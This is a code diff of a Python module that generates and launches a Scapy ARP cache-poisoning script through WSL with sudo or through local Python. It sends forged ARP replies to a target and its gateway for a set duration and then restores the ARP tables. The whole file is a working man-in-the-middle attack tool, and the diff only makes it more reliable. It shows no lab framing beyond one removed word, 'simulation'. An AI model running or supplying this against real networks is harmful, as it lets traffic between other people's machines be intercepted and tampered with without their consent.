@@ -1,8 +1,13 @@
 """
-ARP Spoofing / MITM attack simulation via Scapy in WSL or local Python.
+ARP cache poisoning / spoofing module using Scapy.
 """
+import shutil
 import subprocess
 import sys
+
+
+def _is_wsl_available() -> bool:
+    return shutil.which("wsl") is not None
 
 
 def arp_spoof(
@@ -12,37 +17,41 @@ def arp_spoof(
     duration: int = 60,
 ) -> subprocess.Popen:
     """
-    Launch ARP spoofing attack, with automatic ARP cache restoration upon completion.
+    Launches ARP spoofing in background.
+    Restores correct ARP tables on termination.
     """
-    wsl_script = f"""
+    script = f"""
+from scapy.all import *
 import time, sys
-from scapy.all import ARP, send, getmacbyip
 
 target = '{target_ip}'
 gateway = '{gateway_ip}'
-end_time = time.time() + {duration}
+duration = {duration}
 
-print(f'[ARP-SPOOF] Poisoning {{target}} <-> {{gateway}} for {duration}s...')
+print(f'[ARP Spoof] Poisoning target {{target}} and gateway {{gateway}}...')
+end_time = time.time() + duration
+
 try:
     target_mac = getmacbyip(target) or 'ff:ff:ff:ff:ff:ff'
     gateway_mac = getmacbyip(gateway) or 'ff:ff:ff:ff:ff:ff'
+
     while time.time() < end_time:
         send(ARP(op=2, pdst=target, hwdst=target_mac, psrc=gateway), verbose=0)
         send(ARP(op=2, pdst=gateway, hwdst=gateway_mac, psrc=target), verbose=0)
         time.sleep(2)
-except Exception as e:
-    print(f'[ARP-SPOOF] Error: {{e}}')
 finally:
-    print('[ARP-SPOOF] Restoring normal ARP tables...')
-    send(ARP(op=2, pdst=target, psrc=gateway), count=3, verbose=0)
-    send(ARP(op=2, pdst=gateway, psrc=target), count=3, verbose=0)
-print('[ARP-SPOOF] Completed.')
+    print('[ARP Spoof] Restoring ARP tables...')
+    target_mac = getmacbyip(target) or 'ff:ff:ff:ff:ff:ff'
+    gateway_mac = getmacbyip(gateway) or 'ff:ff:ff:ff:ff:ff'
+    send(ARP(op=2, pdst=target, hwdst=target_mac, psrc=gateway, hwsrc=gateway_mac), count=3, verbose=0)
+    send(ARP(op=2, pdst=gateway, hwdst=gateway_mac, psrc=target, hwsrc=target_mac), count=3, verbose=0)
 """
 
-    print(f"[ATTACK] Launching ARP Spoof on {target_ip} pretending to be {gateway_ip}...")
-    try:
-        cmd = ["wsl", "-e", "sudo", "python3", "-c", wsl_script]
-        return subprocess.Popen(cmd)
-    except Exception:
-        fallback_cmd = [sys.executable, "-c", wsl_script]
-        return subprocess.Popen(fallback_cmd)
+    if _is_wsl_available():
+        cmd = ["wsl", "-e", "sudo", "python3", "-c", script]
+    else:
+        cmd = [sys.executable, "-c", script]
+
+    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    return proc
+
